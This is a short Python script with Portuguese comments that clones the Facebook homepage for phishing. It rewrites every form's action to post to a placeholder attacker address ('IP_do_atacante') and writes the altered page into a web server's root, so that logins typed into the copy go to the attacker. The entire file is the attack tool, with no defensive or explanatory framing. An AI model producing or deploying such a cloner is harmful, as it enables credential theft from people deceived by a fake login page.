from bs4 import BeautifulSoup
import requests

URL = "http://facebook.com"

resposta = requests.get(URL)
bs = BeautifulSoup(resposta.text, "lxml")
forms = bs.find_all("form") #1
for form in forms: #2
    form["action"] = "http://IP_do_atacante/index2.php" #3

with open("/var/www/html/index.html", "w") as pagina: #4
    pagina.write(str(bs)) #5

print "Pagina clonada com sucesso"